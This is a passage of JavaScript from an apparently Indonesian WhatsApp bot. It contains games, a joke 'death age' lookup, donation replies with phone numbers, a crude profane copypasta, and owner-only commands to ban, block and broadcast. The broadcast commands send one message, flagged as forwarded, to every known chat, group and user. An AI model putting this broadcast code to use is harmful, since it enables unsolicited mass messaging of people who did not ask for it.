awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
 setReply(awikwok)
break
//=================================================//
case "cekmati":
if (isBan) return //sticBanLu(from)
if (!q) return setReply(`Invalid!\n\nYg mau di cek siapa kontol?`)
predea = await axios.get(`https://api.agify.io/?name=${q}`)
setReply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
break
//=================================================//
case "ttc": case "ttt": case "tictactoe": {
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith("tictactoe") && [room.game.playerX, room.game.playerO].includes(m.sender))) return setReply("Kamu masih didalam game") 
let room = Object.values(this.game).find(room => room.state === "WAITING" && (text ? room.name === text : true))
if (room) {
setReply("Partner ditemukan!")
room.o = m.chat
room.game.playerO = m.sender
room.state = "PLAYING"
let arr = room.game.render().map(v => {
return {
X: "❌",
O: "⭕",
1: "1️⃣",
2: "2️⃣",
3: "3️⃣",
4: "4️⃣",
5: "5️⃣",
6: "6️⃣",
7: "7️⃣",
8: "8️⃣",
9: "9️⃣",
}[v]
})
let str = `Room ID: ${room.id}
${arr.slice(0, 3).join("")}
${arr.slice(3, 6).join("")}
${arr.slice(6).join("")}
Menunggu @${room.game.currentTurn.split("@")[0]}
Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await zyren.sendText(room.x, str, m, { mentions: parseMention(str) } )
await zyren.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: "tictactoe-" + (+new Date),
x: m.chat,
o: "",
game: new TicTacToe(m.sender, "o"),
state: "WAITING"
}
if (text) room.name = text
setReply("Menunggu partner" + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ""))
this.game[room.id] = room
}
}
break
//=================================================//
case "delttc": case "delttt": {
if (isBan) return //sticBanLu(from)
this.game = this.game ? this.game : {}
try {
if (this.game) {
delete this.game
zyren.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
} else if (!this.game) {
setReply(`Session TicTacToe🎮 tidak ada`)
} else return setReply("?") 
} catch (e) {
setReply("rusak")
}
}
break
//=================================================//
case "suitpvp": case "suit": {
if (isBan) return //sticBanLu(from)
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith("suit") && [roof.p, roof.p2].includes(m.sender))) setReply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return setReply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return setReply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + "@s.whatsapp.net"] })
if (Object.values(this.suit).find(roof => roof.id.startsWith("suit") && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return setReply(`Orang yang kamu tantang sedang bermain suit bersama orang lain :(`) 
let id = "suit_" + new Date() * 1
let caption = `_*SUIT PvP*_
@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit
Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await zyren.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: "wait",
waktu: setTimeout(() => {
if (this.suit[id]) zyren.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
//=================================================//
case "sdqwiejd": {
if (isBan) return //sticBanLu(from)
zyren.sendMessage(m.chat, { image: { url: "https://telegra.ph/file/efea71e033633b9be5ee5.jpg" }, caption: `` }, { quoted: tzy })
}
break
case "donasi": case "sewabot": case "sewa": case "buypremium": case "donate": {
if (isBan) return //sticBanLu(from)
let buttons = [
{buttonId: `qbwixhxjw`, buttonText: { displayText: `GOPAY & DANA` }, type: 1 },
{buttonId: `sdqwiejd`, buttonText: { displayText: `ALL QRIS` }, type: 1 },
{buttonId: `qjqidjxw`, buttonText: { displayText: `OVO` }, type: 1 },
]
let buttonMessage = {
image: ppnyauser,
mimeType: "image/jpg",
caption: `CLICK BUTTON DI BAWAH UNTUK MEMBAYAR!!`,
footer: copyright,
buttons: buttons,
headerType: 4
}
zyren.sendMessage(m.chat, buttonMessage, { quoted: tzy })
}
break
case "qbwixhxjw": {
if (isBan) return //sticBanLu(from)
setReply("NO : 081991410940")
}
break
case "qjqidjxw": {
if (isBan) return //sticBanLu(from)
setReply("NO : 085764726440")
}
break
//=================================================//
case "yt": {
if (isBan) return //sticBanLu(from)
setReply("My Chenell : https://youtube.com/c/PakTzy")
}
break
//=================================================//
case "family100": {
if (isBan) return //sticBanLu(from)
if ("family100"+m.chat in _family100) {
setReply("Masih Ada Sesi Yang Belum Diselesaikan!")
return false
}
let anu = await fetchJson("https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json")
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(" ")) ? `(beberapa Jawaban Terdapat Spasi)` : ""}`.trim()
_family100["family100"+m.chat] = {
id: "family100"+m.chat,
pesan: await zyren.sendText(m.chat, hasil, m),
...random,
terjawab: Array.from(random.jawaban, () => false),
hadiah: 6,
}
}
break
//=================================================//
case "halah": case "hilih": case "huluh": case "heleh": case "holoh":
if (isBan) return //sticBanLu(from)
if (!m.quoted && !text) return setReply(`Kirim/setReply text dengan caption ${prefix + command}`) 
ter = command[1].toLowerCase()
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
setReply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
break
//=================================================//
case "tebak": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`) 
if (args[0] === "lagu") {
if (tebaklagu.hasOwnProperty(m.sender.split("@")[0])) return setReply("Masih Ada Sesi Yang Belum Diselesaikan!") 
let anu = await fetchJson("https://fatiharridho.github.io/tebaklagu.json")
let result = anu[Math.floor(Math.random() * anu.length)]
let msg = await zyren.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: "audio/mpeg" }, { quoted: tzy })
zyren.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
tebaklagu[m.sender.split("@")[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklagu.hasOwnProperty(m.sender.split("@")[0])) {
console.log("Jawaban: " + result.jawaban)
zyren.sendButtonText(m.chat, [{ buttonId: "tebak lagu", buttonText: { displayText: "Tebak Lagu" }, type: 1 }], `Waktu Habis\nJawaban:${tebaklagu[m.sender.split("@")[0]]}\n\nIngin bermain? tekan button dibawah`, zyren.user.name, m)
delete tebaklagu[m.sender.split("@")[0]]
}
} else if (args[0] === "gambar") {
if (tebakgambar.hasOwnProperty(m.sender.split("@")[0])) return setReply("Masih Ada Sesi Yang Belum Diselesaikan!") 
let anu = await fetchJson("https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json")
let result = anu[Math.floor(Math.random() * anu.length)]
zyren.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
tebakgambar[m.sender.split("@")[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakgambar.hasOwnProperty(m.sender.split("@")[0])) {
console.log("Jawaban: " + result.jawaban)
zyren.sendButtonText(m.chat, [{ buttonId: "tebak gambar", buttonText: { displayText: "Tebak Gambar" }, type: 1 }], `Waktu Habis\nJawaban:${tebakgambar[m.sender.split("@")[0]]}\n\nIngin bermain? tekan button dibawah`, zyren.user.name, m)
delete tebakgambar[m.sender.split("@")[0]]
}
} else if (args[0] === "kata") {
if (tebakkata.hasOwnProperty(m.sender.split("@")[0])) return setReply("Masih Ada Sesi Yang Belum Diselesaikan!") 
let anu = await fetchJson("https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json")
let result = anu[Math.floor(Math.random() * anu.length)]
zyren.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkata[m.sender.split("@")[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkata.hasOwnProperty(m.sender.split("@")[0])) {
console.log("Jawaban: " + result.jawaban)
zyren.sendButtonText(m.chat, [{ buttonId: "tebak kata", buttonText: { displayText: "Tebak Kata" }, type: 1 }], `Waktu Habis\nJawaban:${tebakkata[m.sender.split("@")[0]]}\n\nIngin bermain? tekan button dibawah`, zyren.user.name, m)
delete tebakkata[m.sender.split("@")[0]]
}
} else if (args[0] === "kalimat") {
if (tebakkalimat.hasOwnProperty(m.sender.split("@")[0])) return setReply("Masih Ada Sesi Yang Belum Diselesaikan!") 
let anu = await fetchJson("https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json")
let result = anu[Math.floor(Math.random() * anu.length)]
zyren.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkalimat[m.sender.split("@")[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkalimat.hasOwnProperty(m.sender.split("@")[0])) {
console.log("Jawaban: " + result.jawaban)
zyren.sendButtonText(m.chat, [{ buttonId: "tebak kalimat", buttonText: { displayText: "Tebak Kalimat" }, type: 1 }], `Waktu Habis\nJawaban:${tebakkalimat[m.sender.split("@")[0]]}\n\nIngin bermain? tekan button dibawah`, zyren.user.name, m)
delete tebakkalimat[m.sender.split("@")[0]]
}
} else if (args[0] === "lirik") {
if (tebaklirik.hasOwnProperty(m.sender.split("@")[0])) return setReply("Masih Ada Sesi Yang Belum Diselesaikan!") 
let anu = await fetchJson("https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json")
let result = anu[Math.floor(Math.random() * anu.length)]
zyren.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
tebaklirik[m.sender.split("@")[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklirik.hasOwnProperty(m.sender.split("@")[0])) {
console.log("Jawaban: " + result.jawaban)
zyren.sendButtonText(m.chat, [{ buttonId: "tebak lirik", buttonText: { displayText: "Tebak Lirik" }, type: 1 }], `Waktu Habis\nJawaban:${tebaklirik[m.sender.split("@")[0]]}\n\nIngin bermain? tekan button dibawah`, zyren.user.name, m)
delete tebaklirik[m.sender.split("@")[0]]
}
} else if (args[0] === "lontong") {
if (caklontong.hasOwnProperty(m.sender.split("@")[0])) return setReply("Masih Ada Sesi Yang Belum Diselesaikan!") 
let anu = await fetchJson("https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json")
let result = anu[Math.floor(Math.random() * anu.length)]
zyren.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
caklontong[m.sender.split("@")[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split("@")[0]] = result.deskripsi
})
await sleep(60000)
if (caklontong.hasOwnProperty(m.sender.split("@")[0])) {
console.log("Jawaban: " + result.jawaban)
zyren.sendButtonText(m.chat, [{ buttonId: "tebak lontong", buttonText: { displayText: "Tebak Lontong" }, type: 1 }], `Waktu Habis\nJawaban:${caklontong[m.sender.split("@")[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split("@")[0]]}\n\nIngin bermain? tekan button dibawah`, zyren.user.name, m)
delete caklontong[m.sender.split("@")[0]]
delete caklontong_desk[m.sender.split("@")[0]]
}
}
}
break
//=================================================//
case "kuismath": case "math": {
if (isBan) return //sticBanLu(from)
if (kuismath.hasOwnProperty(m.sender.split("@")[0])) return setReply("Masih Ada Sesi Yang Belum Diselesaikan!") 
let { genMath, modes } = require("../basetzy/lib/math")
if (!text) return setReply(`Mode: ${Object.keys(modes).join(" | ")}\nContoh penggunaan: ${prefix}math medium`) 
let result = await genMath(text.toLowerCase())
zyren.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
kuismath[m.sender.split("@")[0]] = result.jawaban
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split("@")[0])) {
console.log("Jawaban: " + result.jawaban)
setReply("Waktu Habis\nJawaban: " + kuismath[m.sender.split("@")[0]])
delete kuismath[m.sender.split("@")[0]]
}
}
break
//=================================================//
case "jodohku": {
if (isBan) return //sticBanLu(from)
if (!m.isGroup) return onlyGroup()
let member = participants.map(u => u.id)
let me = m.sender
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `👫Jodoh mu adalah
@${me.split("@")[0]} ❤️ @${jodoh.split("@")[0]}`
let ments = [me, jodoh]
let buttons = [
{ buttonId: "jodohku", buttonText: { displayText: "Jodohku" }, type: 1 }
]
await zyren.sendButtonText(m.chat, buttons, jawab, zyren.user.name, m, {mentions: ments})
}
break
//=================================================//
case "jadian": {
if (isBan) return //sticBanLu(from)
if (!m.isGroup) return onlyGroup()
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤
@${orang.split("@")[0]} ❤️ @${jodoh.split("@")[0]}`
let menst = [orang, jodoh]
let buttons = [
{ buttonId: "jadian", buttonText: { displayText: "Jodohku" }, type: 1 }
]
await zyren.sendButtonText(m.chat, buttons, jawab, zyren.user.name, m, {mentions: menst})
}
break










//=================================================//
case "join":{
if (!isCreator) return onlyOwner()
if (!text) return setReply("Masukkan Link Group!") 
if (!isUrl(args[0]) && !args[0].includes("whatsapp.com")) return setReply("Link Invalid!") 
let result = args[0].split("https://chat.whatsapp.com/")[1]
await zyren.groupAcceptInvite(result).then((res) => setReply("Success join group")).catch((err) => setReply(jsonformat(err)))
}
break
//=================================================//
case "leave":
if (!m.isGroup) return onlyGroup()
if (!isCreator) return onlyOwner()
await zyren.groupLeave(m.chat)
break
//=================================================//
case "creategc":{
if (!isCreator) return onlyOwner()
if (!text) return setReply("Nama groupnya?")
let cret = await zyren.groupCreate(text, [])
let response = await zyren.groupInviteCode(cret.id)
let teks = `\`\`\`「  CREATION GROUP MESSAGE  」\`\`\`

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
▸ Link : https://chat.whatsapp.com/${response}
`
setTimeout(() => {
setReply(teks) 
}, 7000)
setTimeout(() => {
zyren.groupParticipantsUpdate(cret.id, [m.sender], "promote")
}, 5000)
setTimeout(() => {
zyren.groupParticipantsUpdate(cret.id, [m.sender], "add")
}, 1000)
}
break
//=================================================//
case "bc":{
if (!isCreator) return onlyOwner()
let data = await store.chats.all()
if (isImage || isQuotedImage) {
if (!text) return setReply(mess.query.text)
let teks = `\`\`\`「  BROADCAST MESSAGE  」\`\`\`\n\n${text}`
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
for (let x of data) {
await zyren.sendMessage(x.id, { contextInfo: { forwardingScore: 10, isForwarded: true }, image: { url: media }, caption: teks, footer: copyright })
await sleep(1000)
} 
} else if (isVideo || isQuotedVideo) {
if (!text) return setReply(mess.query.text)
let teks = `\`\`\`「  BROADCAST MESSAGE  」\`\`\`\n\n${text}`
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
for (let x of data) {
await zyren.sendMessage(x.id, { contextInfo: { forwardingScore: 10, isForwarded: true }, video: { url: media }, caption: teks, footer: copyright })
await sleep(1000)
}
} else if (isQuotedSticker) {
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
for (let x of data) {
await zyren.sendMessage(x.id, { sticker: { url: media }})
await sleep(1000)
}
} else if (isQuotedAudio) {
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
for (let x of data) {
await zyren.sendMessage(x.id, { contextInfo: { forwardingScore: 10, isForwarded: true }, audio: { url: media }, mimetype: "audio/mp4", ptt: true })
await sleep(1000)
}
} else if (!isAllMedia && !isQuotedAllMedia) {
if (!text) return setReply(mess.query.text)
let teks = `\`\`\`「  BROADCAST MESSAGE  」\`\`\`\n\n${text}`
for (let x of data) {
await zyren.sendMessage(x.id, { contextInfo: { forwardingScore: 10, isForwarded: true }, text: teks })
await sleep(1000)
}
}
setReply(`Success send broadcast message to ${data.length} chats`)
}
break
//=================================================//
case "bcgc":{
if (!isCreator) return onlyOwner()
let getGroups = await zyren.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let data = groupss.map((v) => v.id)
if (isImage || isQuotedImage) {
if (!text) return setReply("Text?")
let teks = `\`\`\`「  BROADCAST GROUP  」\`\`\`\n\n${text}`
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
for (let x of data) {
await zyren.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: true }, image: { url: media }, caption: teks, footer: copyright })
await sleep(1000)
} 
} else if (isVideo || isQuotedVideo) {
if (!text) return setReply("Text?")
let teks = `\`\`\`「  BROADCAST GROUP  」\`\`\`\n\n${text}`
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
for (let x of data) {
await zyren.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: true }, video: { url: media }, caption: teks, footer: copyright })
await sleep(1000)
}
} else if (isQuotedSticker) {
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
for (let x of data) {
await zyren.sendMessage(x, { sticker: { url: media }})
await sleep(1000)
}
} else if (isQuotedAudio) {
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
for (let x of data) {
await zyren.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: true }, audio: { url: media }, mimetype: "audio/mp4", ptt: true })
await sleep(1000)
}
} else if (!isAllMedia && !isQuotedAllMedia) {
if (!text) return setReply("Text?")
let teks = `\`\`\`「  BROADCAST GROUP  」\`\`\`\n\n${text}`
for (let x of data) {
await zyren.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: true }, text: teks })
await sleep(1000)
}
}
setReply(`Success send broadcast message to ${data.length} groups chats`)
}
break
//=================================================//
case "bcpc":{
if (!isCreator) return onlyOwner()
let data = Object.keys(db.data.users)
if (isImage || isQuotedImage) {
if (!text) return setReply("Text?")
let teks = `\`\`\`「  BROADCAST MESSAGE  」\`\`\`\n\n${text}`
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
for (let x of data) {
await zyren.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: true }, image: { url: media }, caption: teks, footer: copyright })
await sleep(1000)
} 
} else if (isVideo || isQuotedVideo) {
if (!text) return setReply("Text?")
let teks = `\`\`\`「  BROADCAST MESSAGE  」\`\`\`\n\n${text}`
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
for (let x of data) {
await zyren.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: true }, video: { url: media }, caption: teks, footer: copyright })
await sleep(1000)
}
} else if (isQuotedSticker) {
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
for (let x of data) {
await zyren.sendMessage(x, { sticker: { url: media }})
await sleep(1000)
}
} else if (isQuotedAudio) {
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
for (let x of data) {
await zyren.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: true }, audio: { url: media }, mimetype: "audio/mp4", ptt: true })
await sleep(1000)
}
} else if (!isAllMedia && !isQuotedAllMedia) {
if (!text) return setReply("Text?")
let teks = `\`\`\`「  BROADCAST MESSAGE  」\`\`\`\n\n${text}`
for (let x of data) {
await zyren.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: true }, text: teks })
await sleep(1000)
}
}
setReply(`Success send broadcast message to ${data.length} chats`)
}
break
//=================================================//
case "getcase":
if (!isCreator) return onlyOwner()
if (!args[0]) return setReply("Mau ngambil case apa?")
try{
setReply(getCase(args[0]))
} catch {
setReply("Case Tidak Ditemukan")
}
break
//=================================================//
case "ban": case "banned":
if (!isCreator) return onlyOwner()
if (!Input) return setReply("Reply pesan/Tag orang/Nomer")
if (db.data.banned[Input]) return setReply("Sudah di ban") 
db.data.banned[Input] = {
date: calender, 
reason: "Tidak di ketahui"
}
setReply(`Success banned @${Input.split("@")[0]}`) 
break
//=================================================//
case "unban": case "unbanned":
if (!isCreator) return onlyOwner()
if (!Input) return setReply("Reply pesan/Tag orang/Nomer")
if (!db.data.banned[Input]) return setReply("Sudah di unban") 
delete db.data.banned[Input]
setReply(`Success unbanned @${Input.split("@")[0]}`) 
break
//=================================================//
case "block":{
if (!isCreator) return onlyOwner()
if (!Input) return setReply("Reply pesan/Tag orang/Nomer")
if (listblock.includes(Input)) return setReply("Sudah di block")
zyren.updateBlockStatus(Input, "block")
setReply(`Success block @${Input.split("@")[0]}`) 
}
break
//=================================================//
case "unblock":{
if (!isCreator) return onlyOwner()
if (!Input) return setReply("Reply pesan/Tag orang/Nomer")
if (!listblock.includes(Input)) return setReply("Sudah di unblock")
zyren.updateBlockStatus(Input, "unblock")
setReply(`Success unblock @${Input.split("@")[0]}`) 
}
break
//=================================================//
case 'setppbot': {
                if (!isCreator) return onlyOwner()
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                var media = await zyren.downloadAndSaveMediaMessage(quoted)
                try {
                if (args[0] == "/full") {
                const { generateProfilePicture } = require("./basetzy/lib/myfunc")
                var { img } = await generateProfilePicture(media)
                await zyren.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
                } else { await zyren.updateProfilePicture(botNumber, { url: media }) }
                setReply('Sukses')
                } catch { setReply('Gagal Mengganti Photo Profile') }
                }
                break
//=================================================//
case "setnomerowner":
if (!isCreator) return onlyOwner()
if (!text) return setReply("Nomernya?")
if (args[0] == "08") return setReply("Gunakan kode negara")
let number = text.replace(new RegExp("[()+-/ +/]", "gi"), "")
db.data.settings[botNumber].nomerowner = number
setReply(`Success changed owner number to ${text}`)
break
//=================================================//
case "setnamaowner":
if (!isCreator) return onlyOwner()
if (!text) return setReply("Namanya?")
db.data.settings[botNumber].namaowner = text
setReply(`Success changed owner name to ${text}`)
break
//=================================================//
case "setcopyright":
if (!isCreator) return onlyOwner()
if (!text) return setReply("Namanya?")
db.data.settings[botNumber].copyright = text
setReply(`Success changed copyright to ${text}`)
break
//=================================================//
case "setmenu":
if (!isCreator) return onlyOwner()
if (args[0] == "lokasi2" || args[0] == "location2") {
if (db.data.settings[botNumber].setmenu == "location2") return setReply("Sudah Active")
db.data.settings[botNumber].setmenu = "location2"
await zyren.sendButMessage(m.chat, `Berhasil Mengganti Tampilan Menu Ke ${args[0]}`, copyright, [
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }], m)
} else if (args[0] == "image" || args[0] == "img") {
if (db.data.settings[botNumber].setmenu == "image") return setReply("Sudah Active")
db.data.settings[botNumber].setmenu = "image"
await zyren.sendButMessage(m.chat, `Berhasil Mengganti Tampilan Menu Ke ${args[0]}`, copyright, [
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }], m)
} else if (args[0] == "lokasi" || args[0] == "location") {
if (db.data.settings[botNumber].setmenu == "location") return setReply("Sudah Active")
db.data.settings[botNumber].setmenu = "location"
await zyren.sendButMessage(m.chat, `Berhasil Mengganti Tampilan Menu Ke ${args[0]}`, copyright, [
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }], m)
} else if (args[0] == "image2" || args[0] == "img2") {
if (db.data.settings[botNumber].setmenu == "image2") return setReply("Sudah Active")
db.data.settings[botNumber].setmenu = "image2"
await zyren.sendButMessage(m.chat, `Berhasil Mengganti Tampilan Menu Ke ${args[0]}`, copyright, [
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }], m)
} else if (args[0] == "gif") {
if (db.data.settings[botNumber].setmenu == "gif") return setReply("Sudah Active")
db.data.settings[botNumber].setmenu = "gif"
await zyren.sendButMessage(m.chat, `Berhasil Mengganti Tampilan Menu Ke ${args[0]}`, copyright, [
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }], m)
} else if (args[0] == "video") {
if (db.data.settings[botNumber].setmenu == "video") return setReply("Sudah Active")
db.data.settings[botNumber].setmenu = "video"
await zyren.sendButMessage(m.chat, `Berhasil Mengganti Tampilan Menu Ke ${args[0]}`, copyright, [
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }], m)
} else if (args[0] == "gif2") {
if (db.data.settings[botNumber].setmenu == "gif2") return setReply("Sudah Active")
db.data.settings[botNumber].setmenu = "gif2"
await zyren.sendButMessage(m.chat, `Berhasil Mengganti Tampilan Menu Ke ${args[0]}`, copyright, [
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }], m)
} else if (args[0] == "video2") {
if (db.data.settings[botNumber].setmenu == "video2") return setReply("Sudah Active")
db.data.settings[botNumber].setmenu = "video2"
await zyren.sendButMessage(m.chat, `Berhasil Mengganti Tampilan Menu Ke ${args[0]}`, copyright, [
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 }], m)
} else {
const sections = [ {
title: `SILAHKAN PILIH`,
rows: [
{title: "LOCATION", rowId: `${prefix + command} location`, description: "TYPE LOCATION"},
{title: "IMAGE", rowId: `${prefix + command} image`, description: "TYPE IMAGE"},
{title: "GIF", rowId: `${prefix + command} gif`, description: "TYPE GIF"},
{title: "VIDEO", rowId: `${prefix + command} video`, description: "TYPE VIDEO"},
{title: "LOCATION 2", rowId: `${prefix + command} location2`, description: "TYPE LOCATION 2"},
{title: "IMAGE 2", rowId: `${prefix + command} image2`, description: "TYPE IMAGE 2"},
{title: "GIF 2", rowId: `${prefix + command} gif2`, description: "TYPE GIF 2"},
{title: "VIDEO 2", rowId: `${prefix + command} video2`, description: "TYPE VIDEO 2"},
]}]
const listMessage = { text: `SETTINGS MENU BOT`, buttonText: "Click Here", sections }
zyren.sendMessage(m.chat, listMessage, { quoted: m })                    
} 
break
//=================================================//
case "setreply":
if (!isCreator) return onlyOwner()
if (args[0] == "web1") {
if (db.data.settings[botNumber].replytype == "web1") return setReply("Sudah Active")
db.data.settings[botNumber].replytype = "web1"
await setReply(`Berhasil Mengganti Reply Ke ${args[0]}`)
} else if (args[0] == "web2") {
if (db.data.settings[botNumber].replytype == "web2") return setReply("Sudah Active")
db.data.settings[botNumber].replytype = "web2"
await setReply(`Berhasil Mengganti Reply Ke ${args[0]}`)
} else if (args[0] == "web3") {
